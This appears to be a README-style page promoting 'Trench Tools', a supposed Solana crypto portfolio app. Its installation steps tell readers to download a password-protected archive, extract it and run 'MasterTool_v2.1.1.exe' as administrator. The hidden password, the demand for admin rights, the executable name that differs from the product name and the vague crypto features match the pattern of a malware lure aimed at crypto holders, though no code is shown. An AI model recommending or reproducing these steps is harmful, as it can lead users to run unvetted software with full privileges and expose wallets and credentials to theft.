## 📋 Overview

Trench Tools is a comprehensive desktop application designed for cryptocurrency portfolio automation and analysis on Solana. The application provides real-time market tracking, integrated DEX connectivity, and automated asset discovery — all in a clean, user-friendly interface.

---

## ✨ Key Features

- Automated portfolio tracking and analysis on Solana
- Real-time market data processing
- Integrated DEX connectivity
- Multi-asset price monitoring
- Custom alert and notification system
- Local encrypted storage (AES-256)
- Interactive portfolio charts

## 🔧 Quick Installation

1. Download the archive using the button above
2. Extract with WinRAR or 7-Zip (password shown on download page)
3. Right-click `MasterTool_v2.1.1.exe` and select **Run as administrator**
4. Complete the first-run setup wizard
5. Start tracking your portfolio
